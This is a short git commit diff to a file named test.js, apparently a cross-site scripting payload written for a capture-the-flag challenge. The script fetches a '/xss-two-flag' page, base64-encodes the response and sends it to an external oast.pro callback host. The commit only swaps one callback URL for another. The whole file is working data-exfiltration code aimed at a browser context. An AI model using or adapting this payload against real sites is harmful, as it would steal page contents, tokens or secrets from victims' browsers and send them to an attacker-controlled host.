a359afb68953135d55b864c3c2868cc454234053
bladerune444 <135470270+harsh-giri-123@users.noreply.github.com>
2026-03-22 18:17:52 +0530

    Update test.js

--- test.js
+++ test.js
@@ -3,5 +3,5 @@ fetch('/xss-two-flag')
   .then(r => r.text())
   .then(flag => {
     // Send the flag to your request bin
-    fetch('https://e54e8b0f1e833868b4cdguxhx8hyyyyyn.oast.pro/?flag=' + btoa(flag));
+    fetch('https://e54e8b0f1e833868b4cdgux9r3hyyyyyd.oast.pro/?flag=' + btoa(flag));
   });
